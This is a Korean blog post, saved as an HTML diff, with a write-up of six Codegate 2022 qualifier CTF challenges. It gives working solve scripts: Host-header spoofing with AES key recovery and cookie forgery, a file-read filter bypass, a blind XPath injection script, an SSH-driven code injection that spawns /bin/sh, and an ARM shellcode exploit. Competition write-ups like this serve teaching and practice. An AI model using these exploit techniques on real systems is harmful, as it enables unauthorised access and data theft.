@@ -1,0 +1,431 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Codegate2022 Qual Writeup | imssm99 Blog</title>
+<meta name="keywords" content="" />
+<meta name="description" content="University Division, imssm99, 3rd (4249 points)
+ CAFE bot.py에 admin의 ID/PW가 있어 admin으로 로그인하면 flag를 볼 수 있다.
+driver.get(&#39;http://3.39.55.38:1929/login&#39;) driver.find_element_by_id(&#39;id&#39;).send_keys(&#39;admin&#39;) driver.find_element_by_id(&#39;pw&#39;).send_keys(&#39;$MiLEYEN4&#39;) driver.find_element_by_id(&#39;submit&#39;).click() time.sleep(2)  superbee func (this *AdminController) AuthKey() { 	encrypted_auth_key, _ := AesEncrypt([]byte(auth_key), []byte(auth_crypt_key)) 	this.Ctx.WriteString(hex.EncodeToString(encrypted_auth_key)) } ... auth_crypt_key, _ = web.AppConfig.String(&#34;auth_crypt_key&#34;) auth_crypt_key가 설정되어있지 않아 빈 문자열이다.
+... } else if controllerName == &#34;AdminController&#34; {  domain := this.Ctx.Input.Domain()   if domain != &#34;localhost&#34; {  this.">
+<meta name="author" content="imssm99">
+<link rel="canonical" href="https://blog.imssm99.com/ctf/codegate2022_qual/" />
+<link crossorigin="anonymous" href="/assets/css/stylesheet.min.48a18943c2fc15c38a372b8dde1f5e5dc0bc64fa6cb90f5a817d2f8c76b7f3ae.css" integrity="sha256-SKGJQ8L8FcOKNyuN3h9eXcC8ZPpsuQ9agX0vjHa3864=" rel="preload stylesheet" as="style">
+<script defer crossorigin="anonymous" src="/assets/js/highlight.min.4dcb3c4f38462f66c6b6137227726f5543cb934cca9788f041c087e374491df2.js" integrity="sha256-Tcs8TzhGL2bGthNyJ3JvVUPLk0zKl4jwQcCH43RJHfI="
+    onload="hljs.initHighlightingOnLoad();"></script>
+<link rel="icon" href="https://blog.imssm99.com/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://blog.imssm99.com/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://blog.imssm99.com/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://blog.imssm99.com/apple-touch-icon.png">
+<link rel="mask-icon" href="https://blog.imssm99.com/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+</noscript><meta property="og:title" content="Codegate2022 Qual Writeup" />
+<meta property="og:description" content="University Division, imssm99, 3rd (4249 points)
+ CAFE bot.py에 admin의 ID/PW가 있어 admin으로 로그인하면 flag를 볼 수 있다.
+driver.get(&#39;http://3.39.55.38:1929/login&#39;) driver.find_element_by_id(&#39;id&#39;).send_keys(&#39;admin&#39;) driver.find_element_by_id(&#39;pw&#39;).send_keys(&#39;$MiLEYEN4&#39;) driver.find_element_by_id(&#39;submit&#39;).click() time.sleep(2)  superbee func (this *AdminController) AuthKey() { 	encrypted_auth_key, _ := AesEncrypt([]byte(auth_key), []byte(auth_crypt_key)) 	this.Ctx.WriteString(hex.EncodeToString(encrypted_auth_key)) } ... auth_crypt_key, _ = web.AppConfig.String(&#34;auth_crypt_key&#34;) auth_crypt_key가 설정되어있지 않아 빈 문자열이다.
+... } else if controllerName == &#34;AdminController&#34; {  domain := this.Ctx.Input.Domain()   if domain != &#34;localhost&#34; {  this." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://blog.imssm99.com/ctf/codegate2022_qual/" /><meta property="article:section" content="ctf" />
+<meta property="article:published_time" content="2022-03-28T14:22:00&#43;09:00" />
+<meta property="article:modified_time" content="2022-03-28T14:22:00&#43;09:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Codegate2022 Qual Writeup"/>
+<meta name="twitter:description" content="University Division, imssm99, 3rd (4249 points)
+ CAFE bot.py에 admin의 ID/PW가 있어 admin으로 로그인하면 flag를 볼 수 있다.
+driver.get(&#39;http://3.39.55.38:1929/login&#39;) driver.find_element_by_id(&#39;id&#39;).send_keys(&#39;admin&#39;) driver.find_element_by_id(&#39;pw&#39;).send_keys(&#39;$MiLEYEN4&#39;) driver.find_element_by_id(&#39;submit&#39;).click() time.sleep(2)  superbee func (this *AdminController) AuthKey() { 	encrypted_auth_key, _ := AesEncrypt([]byte(auth_key), []byte(auth_crypt_key)) 	this.Ctx.WriteString(hex.EncodeToString(encrypted_auth_key)) } ... auth_crypt_key, _ = web.AppConfig.String(&#34;auth_crypt_key&#34;) auth_crypt_key가 설정되어있지 않아 빈 문자열이다.
+... } else if controllerName == &#34;AdminController&#34; {  domain := this.Ctx.Input.Domain()   if domain != &#34;localhost&#34; {  this."/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "CTF",
+      "item": "https://blog.imssm99.com/ctf/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  3 ,
+      "name": "Codegate2022 Qual Writeup",
+      "item": "https://blog.imssm99.com/ctf/codegate2022_qual/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Codegate2022 Qual Writeup",
+  "name": "Codegate2022 Qual Writeup",
+  "description": "University Division, imssm99, 3rd (4249 points)\n CAFE bot.py에 admin의 ID/PW가 있어 admin으로 로그인하면 flag를 볼 수 있다.\ndriver.get(\u0026#39;http://3.39.55.38:1929/login\u0026#39;) driver.find_element_by_id(\u0026#39;id\u0026#39;).send_keys(\u0026#39;admin\u0026#39;) driver.find_element_by_id(\u0026#39;pw\u0026#39;).send_keys(\u0026#39;$MiLEYEN4\u0026#39;) driver.find_element_by_id(\u0026#39;submit\u0026#39;).click() time.sleep(2)  superbee func (this *AdminController) AuthKey() { \tencrypted_auth_key, _ := AesEncrypt([]byte(auth_key), []byte(auth_crypt_key)) \tthis.Ctx.WriteString(hex.EncodeToString(encrypted_auth_key)) } ... auth_crypt_key, _ = web.AppConfig.String(\u0026#34;auth_crypt_key\u0026#34;) auth_crypt_key가 설정되어있지 않아 빈 문자열이다.\n... } else if controllerName == \u0026#34;AdminController\u0026#34; {  domain := this.Ctx.Input.Domain()   if domain != \u0026#34;localhost\u0026#34; {  this.",
+  "keywords": [
+    
+  ],
+  "articleBody": " University Division, imssm99, 3rd (4249 points)\n CAFE bot.py에 admin의 ID/PW가 있어 admin으로 로그인하면 flag를 볼 수 있다.\ndriver.get('http://3.39.55.38:1929/login') driver.find_element_by_id('id').send_keys('admin') driver.find_element_by_id('pw').send_keys('$MiLEYEN4') driver.find_element_by_id('submit').click() time.sleep(2)  superbee func (this *AdminController) AuthKey() { \tencrypted_auth_key, _ := AesEncrypt([]byte(auth_key), []byte(auth_crypt_key)) \tthis.Ctx.WriteString(hex.EncodeToString(encrypted_auth_key)) } ... auth_crypt_key, _ = web.AppConfig.String(\"auth_crypt_key\") auth_crypt_key가 설정되어있지 않아 빈 문자열이다.\n... } else if controllerName == \"AdminController\" {  domain := this.Ctx.Input.Domain()   if domain != \"localhost\" {  this.Abort(\"Not Local\")  return  } } ... func (this *AdminController) AuthKey() { \tencrypted_auth_key, _ := AesEncrypt([]byte(auth_key), []byte(auth_crypt_key)) \tthis.Ctx.WriteString(hex.EncodeToString(encrypted_auth_key)) } /admin/authkey에 Host: localhost Header를 설정하여 접속하면 encrypted_auth_key를 얻을 수 있다. encrypted_auth_key를 빈 Key로 Decrypt하여 flag를 얻는데 필요한 Cookie를 설정할 수 있었다.\nimport requests from Crypto.Cipher import AES from Crypto.Util.Padding import pad, unpad import hashlib  url = \"http://localhost:1030\"  r = requests.get(f\"{url}/admin/authkey\", headers={\"Host\": \"localhost\"}) enc_auth_key = bytes.fromhex(r.text)  admin_id = b\"admin\"  cipher = AES.new(pad(b\"\", 16), AES.MODE_CBC, pad(b\"\", 16)) auth_key = unpad(cipher.decrypt(enc_auth_key), 16) print(auth_key)  cookies = {} cookies[hashlib.md5(b\"sess\").hexdigest()] = hashlib.md5(admin_id + auth_key).hexdigest()  r = requests.get(f\"{url}/main/index\", cookies=cookies) print(r.text)  babyFirst lookupImg Method는 메모 내용의 [] 안의 url을 읽어 그 내용을 base64 encode하여 img src에 출력해준다. URL의 처음에 file:이 있으면 동작하지 않는다. 이를 우회하기 위해 java.net.URL에서 찾은 다음과 같은 코드를 이용했다.\nif (spec.regionMatches(true, start, \"url:\", 0, 4)) {  start += 4; } 메모 내용에 [url:file:/flag] 를 쓴 후 읽는다. img src의 값을 base64 decode하여 flag를 획득 할 수 있었다. data:image/jpeg;charset=utf-8;base64,Y29kZWdhdGUyMDIyezg5NTNiZjgzNGZkZGUzNGFlNTE5Mzc5NzVjNzhhODk1ODYzZGUxZTF9Cg==\n myblog XPath xpath = XPathFactory.newInstance().newXPath();  String title = (String)xpath.evaluate(\"//article[@idx='\" + idx + \"']/title/text()\", document, XPathConstants.STRING);  String content = (String)xpath.evaluate(\"//article[@idx='\" + idx + \"']/content/text()\", document, XPathConstants.STRING); /blog/read에서 idx 인자에 xpath injection이 가능하다.\nRUN echo 'flag=codegate2022{md5(flag)}'  /usr/local/tomcat/conf/catalina.propertiescatalina.properties에 flag가 저장되어 있으므로 system-property(’flag’)를 이용하면 flag를 획득할 수 있다.\nBlind Injection으로 flag의 값을 구했다.\nimport requests import string  url = \"http://3.39.79.180\" uid = \"imssm9999\" upw = \"asdasdasd\"  s = requests.Session()  r = s.post(f\"{url}/blog/register\", data={\"id\": uid, \"pw\": upw}) print(r.text)  r = s.post(f\"{url}/blog/login\", data={\"id\":uid, \"pw\": upw}) print(r.text)  r = s.post(f\"{url}/blog/write\", data={\"title\": \"OKOKOK\", \"content\": \"OKOKOK\"}) print(r.text)  def oracle(cond):  idx = f\"0' or {cond}and '1'='1\"  r = s.get(f\"{url}/blog/read\", params={\"idx\": idx})  return \"OKOKOK\" in r.text  flag_len = 0 for i in range(1, 0x100):  if oracle(f\"string-length(system-property('flag'))={i}\"):  flag_len = i  break  print(flag_len)  flag = \"\" for i in range(flag_len):  for c in string.printable:  if oracle(f\"substring(system-property('flag'), {i+1}, 1)='{c}'\"):  flag += c  break  print(flag) print(flag)  VIMT 문자를 입력하면 뒤에 랜덤한 문자열이 추가로 생긴다. 바이너리를 분석해보면 set y {n}을 통해 n번째 줄로 이동할 수 있는 기능이 있다. ssh를 통해 접속하는 문제이므로 stty 명령을 통해 columns를 1로 설정하여 한 줄에 한 문자만 쓰이도록 할 수 있다. 이를 이용해 문자를 입력하고, set y {n}으로 입력한 문자의 다음으로 이동하여 원하는 내용을 쓸 수 있다.\nfrom pwn import *  code = \"\"\"main() { system(\"/bin/sh\"); } //\"\"\" rows = len(code)+10  s = ssh(user=\"ctf\", host=\"3.38.59.103\", port=1234, password=\"ctf1234_smiley\") p = s.process(\"/bin/sh\") p.sendlineafter(\"$ \", f\"stty rows {rows}cols 1\".encode()) p.sendlineafter(\"$ \", b\"./app\")  def rr():  for i in range(rows-1):  p.readline()  rr()  for i in range(len(code)):  p.send(code[i])  rr()  p.send(\"\\x1b\")  p.sendlineafter(\":\", f\"set y {i}\")  p.send(\"\\x1b\") p.sendlineafter(\":\", \"compile\") p.interactive()  ARVM if ( run_vm() == -1 )  exit(-1); puts(\"Good! Now Execute Real Machine\"); dest = calloc(1u, 0x1000u); memcpy(dest, *(const void **)(dword_2407C + 8), 0x1000u); memset(*(void **)(dword_2407C + 8), 0, 0x1000u); memcpy(*(void **)(dword_2407C + 8), \u0026unk_1346C, 0x34u); v3 = memcpy((void *)(*(_DWORD *)(dword_2407C + 8) + 52), dest, 0xFCCu); (*(void (__fastcall **)(void *))(dword_2407C + 8))(v3); vm을 작동하는 함수가 -1을 반환하지 않으면, 입력한 code를 실행해준다. code의 처음에 0x0이 있다면 그대로 run_vm()이 정상적으로 종료되는 것을 확인할 수 있었다. 그 뒤에 shellcode를 추가하여 shell을 획득할 수 있었다.\nfrom pwn import *  context.arch = \"arm\"  p = remote(\"15.165.92.159\", 1234) p.recvline() p.recvline()  code = b\"\" code += p32(0) code += b\"\\x01\\x30\\x8f\\xe2\\x13\\xff\\x2f\\xe1\\x02\\xa0\\x49\\x40\\x52\\x40\\xc2\\x71\\x0b\\x27\\x01\\xdf\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x78\"  p.sendafter(b\": \", code)  def view_code():  p.sendafter(b\": \", b\"2\")  return p.recvuntil(b\"1. Run\")[:-6]  def run_code():  p.sendafter(b\": \", b\"1\")  p.recvuntil(b\"Secret code : \")  code = p.recvline().strip()  p.sendlineafter(b\": \", code)  run_code()  p.interactive() ",
+  "wordCount" : "596",
+  "inLanguage": "en",
+  "datePublished": "2022-03-28T14:22:00+09:00",
+  "dateModified": "2022-03-28T14:22:00+09:00",
+  "author":{
+    "@type": "Person",
+    "name": "imssm99"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://blog.imssm99.com/ctf/codegate2022_qual/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "imssm99 Blog",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://blog.imssm99.com/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class=" dark" id="top">
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://blog.imssm99.com" accesskey="h" title="imssm99 Blog (Alt + H)">imssm99 Blog</a>
+            <span class="logo-switches">
+            </span>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://blog.imssm99.com/aboutme/" title="About Me">
+                    <span>About Me</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://blog.imssm99.com/ctf/" title="CTF">
+                    <span>CTF</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://blog.imssm99.com/tech/" title="TECH">
+                    <span>TECH</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://blog.imssm99.com/etc/" title="ETC">
+                    <span>ETC</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title">
+      Codegate2022 Qual Writeup
+    </h1>
+    <div class="post-meta"><span title='2022-03-28 14:22:00 +0900 KST'>March 28, 2022</span>&nbsp;·&nbsp;imssm99
+
+</div>
+  </header> <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#cafe" aria-label="CAFE">CAFE</a></li>
+                <li>
+                    <a href="#superbee" aria-label="superbee">superbee</a></li>
+                <li>
+                    <a href="#babyfirst" aria-label="babyFirst">babyFirst</a></li>
+                <li>
+                    <a href="#myblog" aria-label="myblog">myblog</a></li>
+                <li>
+                    <a href="#vimt" aria-label="VIMT">VIMT</a></li>
+                <li>
+                    <a href="#arvm" aria-label="ARVM">ARVM</a>
+                </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><blockquote>
+<p>University Division, imssm99, 3rd (4249 points)</p>
+</blockquote>
+<h2 id="cafe">CAFE<a hidden class="anchor" aria-hidden="true" href="#cafe">#</a></h2>
+<p>bot.py에 admin의 ID/PW가 있어 admin으로 로그인하면 flag를 볼 수 있다.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>driver<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;http://3.39.55.38:1929/login&#39;</span>)
+</span></span><span style="display:flex;"><span>driver<span style="color:#f92672">.</span>find_element_by_id(<span style="color:#e6db74">&#39;id&#39;</span>)<span style="color:#f92672">.</span>send_keys(<span style="color:#e6db74">&#39;admin&#39;</span>)
+</span></span><span style="display:flex;"><span>driver<span style="color:#f92672">.</span>find_element_by_id(<span style="color:#e6db74">&#39;pw&#39;</span>)<span style="color:#f92672">.</span>send_keys(<span style="color:#e6db74">&#39;$MiLEYEN4&#39;</span>)
+</span></span><span style="display:flex;"><span>driver<span style="color:#f92672">.</span>find_element_by_id(<span style="color:#e6db74">&#39;submit&#39;</span>)<span style="color:#f92672">.</span>click()
+</span></span><span style="display:flex;"><span>time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">2</span>)
+</span></span></code></pre></div><hr>
+<h2 id="superbee">superbee<a hidden class="anchor" aria-hidden="true" href="#superbee">#</a></h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#66d9ef">func</span> (<span style="color:#a6e22e">this</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">AdminController</span>) <span style="color:#a6e22e">AuthKey</span>() {
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">encrypted_auth_key</span>, <span style="color:#a6e22e">_</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">AesEncrypt</span>([]byte(<span style="color:#a6e22e">auth_key</span>), []byte(<span style="color:#a6e22e">auth_crypt_key</span>))
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">this</span>.<span style="color:#a6e22e">Ctx</span>.<span style="color:#a6e22e">WriteString</span>(<span style="color:#a6e22e">hex</span>.<span style="color:#a6e22e">EncodeToString</span>(<span style="color:#a6e22e">encrypted_auth_key</span>))
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#f92672">...</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">auth_crypt_key</span>, <span style="color:#a6e22e">_</span> = <span style="color:#a6e22e">web</span>.<span style="color:#a6e22e">AppConfig</span>.<span style="color:#a6e22e">String</span>(<span style="color:#e6db74">&#34;auth_crypt_key&#34;</span>)
+</span></span></code></pre></div><p><code>auth_crypt_key</code>가 설정되어있지 않아 빈 문자열이다.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#f92672">...</span>
+</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">controllerName</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;AdminController&#34;</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">domain</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">this</span>.<span style="color:#a6e22e">Ctx</span>.<span style="color:#a6e22e">Input</span>.<span style="color:#a6e22e">Domain</span>()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">domain</span> <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#34;localhost&#34;</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">this</span>.<span style="color:#a6e22e">Abort</span>(<span style="color:#e6db74">&#34;Not Local&#34;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#f92672">...</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">func</span> (<span style="color:#a6e22e">this</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">AdminController</span>) <span style="color:#a6e22e">AuthKey</span>() {
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">encrypted_auth_key</span>, <span style="color:#a6e22e">_</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">AesEncrypt</span>([]byte(<span style="color:#a6e22e">auth_key</span>), []byte(<span style="color:#a6e22e">auth_crypt_key</span>))
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">this</span>.<span style="color:#a6e22e">Ctx</span>.<span style="color:#a6e22e">WriteString</span>(<span style="color:#a6e22e">hex</span>.<span style="color:#a6e22e">EncodeToString</span>(<span style="color:#a6e22e">encrypted_auth_key</span>))
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p><code>/admin/authkey</code>에 <code>Host: localhost</code> Header를 설정하여 접속하면 <code>encrypted_auth_key</code>를 얻을 수 있다.
+<code>encrypted_auth_key</code>를 빈 Key로 Decrypt하여 flag를 얻는데 필요한 Cookie를 설정할 수 있었다.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> Crypto.Cipher <span style="color:#f92672">import</span> AES
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> Crypto.Util.Padding <span style="color:#f92672">import</span> pad, unpad
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> hashlib
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://localhost:1030&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>url<span style="color:#e6db74">}</span><span style="color:#e6db74">/admin/authkey&#34;</span>, headers<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;Host&#34;</span>: <span style="color:#e6db74">&#34;localhost&#34;</span>})
+</span></span><span style="display:flex;"><span>enc_auth_key <span style="color:#f92672">=</span> bytes<span style="color:#f92672">.</span>fromhex(r<span style="color:#f92672">.</span>text)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>admin_id <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;admin&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>cipher <span style="color:#f92672">=</span> AES<span style="color:#f92672">.</span>new(pad(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#ae81ff">16</span>), AES<span style="color:#f92672">.</span>MODE_CBC, pad(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#ae81ff">16</span>))
+</span></span><span style="display:flex;"><span>auth_key <span style="color:#f92672">=</span> unpad(cipher<span style="color:#f92672">.</span>decrypt(enc_auth_key), <span style="color:#ae81ff">16</span>)
+</span></span><span style="display:flex;"><span>print(auth_key)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>cookies <span style="color:#f92672">=</span> {}
+</span></span><span style="display:flex;"><span>cookies[hashlib<span style="color:#f92672">.</span>md5(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;sess&#34;</span>)<span style="color:#f92672">.</span>hexdigest()] <span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>md5(admin_id <span style="color:#f92672">+</span> auth_key)<span style="color:#f92672">.</span>hexdigest()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>url<span style="color:#e6db74">}</span><span style="color:#e6db74">/main/index&#34;</span>, cookies<span style="color:#f92672">=</span>cookies)
+</span></span><span style="display:flex;"><span>print(r<span style="color:#f92672">.</span>text)
+</span></span></code></pre></div><hr>
+<h2 id="babyfirst">babyFirst<a hidden class="anchor" aria-hidden="true" href="#babyfirst">#</a></h2>
+<p><code>lookupImg</code> Method는 메모 내용의 <code>[]</code> 안의 url을 읽어 그 내용을 base64 encode하여 img src에 출력해준다.
+URL의 처음에 <code>file:</code>이 있으면 동작하지 않는다.
+이를 우회하기 위해 java.net.URL에서 찾은 다음과 같은 코드를 이용했다.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>spec<span style="color:#f92672">.</span><span style="color:#a6e22e">regionMatches</span><span style="color:#f92672">(</span><span style="color:#66d9ef">true</span><span style="color:#f92672">,</span> start<span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;url:&#34;</span><span style="color:#f92672">,</span> 0<span style="color:#f92672">,</span> 4<span style="color:#f92672">))</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>    start <span style="color:#f92672">+=</span> 4<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span></code></pre></div><p>메모 내용에 <code>[url:file:/flag]</code> 를 쓴 후 읽는다.
+img src의 값을 base64 decode하여 flag를 획득 할 수 있었다.
+<code>data:image/jpeg;charset=utf-8;base64,Y29kZWdhdGUyMDIyezg5NTNiZjgzNGZkZGUzNGFlNTE5Mzc5NzVjNzhhODk1ODYzZGUxZTF9Cg==</code></p>
+<hr>
+<h2 id="myblog">myblog<a hidden class="anchor" aria-hidden="true" href="#myblog">#</a></h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>XPath xpath <span style="color:#f92672">=</span> XPathFactory<span style="color:#f92672">.</span><span style="color:#a6e22e">newInstance</span><span style="color:#f92672">().</span><span style="color:#a6e22e">newXPath</span><span style="color:#f92672">();</span>
+</span></span><span style="display:flex;"><span>      String title <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>String<span style="color:#f92672">)</span>xpath<span style="color:#f92672">.</span><span style="color:#a6e22e">evaluate</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;//article[@idx=&#39;&#34;</span> <span style="color:#f92672">+</span> idx <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&#39;]/title/text()&#34;</span><span style="color:#f92672">,</span> document<span style="color:#f92672">,</span> XPathConstants<span style="color:#f92672">.</span><span style="color:#a6e22e">STRING</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>      String content <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>String<span style="color:#f92672">)</span>xpath<span style="color:#f92672">.</span><span style="color:#a6e22e">evaluate</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;//article[@idx=&#39;&#34;</span> <span style="color:#f92672">+</span> idx <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&#39;]/content/text()&#34;</span><span style="color:#f92672">,</span> document<span style="color:#f92672">,</span> XPathConstants<span style="color:#f92672">.</span><span style="color:#a6e22e">STRING</span><span style="color:#f92672">);</span>
+</span></span></code></pre></div><p>/blog/read에서 idx 인자에 xpath injection이 가능하다.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-docker" data-lang="docker"><span style="display:flex;"><span><span style="color:#66d9ef">RUN</span> echo <span style="color:#e6db74">&#39;flag=codegate2022{md5(flag)}&#39;</span> &gt;&gt; /usr/local/tomcat/conf/catalina.properties<span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><p>catalina.properties에 flag가 저장되어 있으므로 <code>system-property(’flag’)</code>를 이용하면 flag를 획득할 수 있다.</p>
+<p>Blind Injection으로 flag의 값을 구했다.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> string
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://3.39.79.180&#34;</span>
+</span></span><span style="display:flex;"><span>uid <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;imssm9999&#34;</span>
+</span></span><span style="display:flex;"><span>upw <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;asdasdasd&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>s <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>Session()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>r <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>post(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>url<span style="color:#e6db74">}</span><span style="color:#e6db74">/blog/register&#34;</span>, data<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;id&#34;</span>: uid, <span style="color:#e6db74">&#34;pw&#34;</span>: upw})
+</span></span><span style="display:flex;"><span>print(r<span style="color:#f92672">.</span>text)
+</span></span><span style="display:flex;"><span>
